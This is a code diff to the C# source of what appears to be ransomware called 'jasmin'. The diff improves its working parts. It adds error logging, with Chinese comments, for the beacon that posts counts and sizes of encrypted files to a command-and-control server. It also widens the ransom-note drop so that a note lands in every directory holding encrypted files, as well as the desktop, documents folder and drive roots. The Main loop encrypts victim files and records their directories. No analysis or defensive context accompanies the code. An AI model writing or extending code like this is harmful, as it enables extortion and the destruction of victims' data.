@@ -130,23 +130,34 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
       new("total_count",(totalCnt>0?totalCnt:cnt).ToString()),
       new("total_size",(totalSz>0?totalSz:sz).ToString())};
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
-  }catch{}}
+  }catch(Exception ex){if(P_CONSOLE){try{
+    Console.Error.WriteLine("[jasmin] !!! 上报失败: "+C2);
+    Console.Error.WriteLine("[jasmin] !!! "+ex.Message);
+    Console.Error.WriteLine("[jasmin] !!! 请检查回连地址、端口(本服务在 :8080)、握手密钥");
+  }catch{}}}}
 
 static string SID="";
 static string NOTE=@"
 {{RANSOM_NOTE}}
 ";
 
+static System.Collections.Generic.HashSet<string> NOTE_DIRS=new System.Collections.Generic.HashSet<string>();
+
 static void DropNotes(){
   string txt=NOTE.Replace("{SID}",SID);
+  int wrote=0;
   string[] dirs={
     Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
   foreach(string d in dirs){
-    try{if(Directory.Exists(d))File.WriteAllText(Path.Combine(d,"READ_ME_解密教程.txt"),txt);}catch{}}
+    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
+  // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
+  foreach(string d in NOTE_DIRS){
+    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
   foreach(DriveInfo dr in DriveInfo.GetDrives()){
-    try{File.WriteAllText(dr.Name+"READ_ME_解密教程.txt",txt);}catch{}}
+    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch{}}
+  if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 勒索信已投放 "+wrote+" 处");}catch{}}
 }
 
 // ── 预扫描：只统计数量与总字节，不保存路径列表 ──
@@ -184,6 +195,7 @@ static void Main(){
           bool ok=Enc(fc);
           Tick(fc,fszc,ok);
           if(ok){lock(lk){encCount++;encSize+=fszc;
+            try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
             string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
             if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
             typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
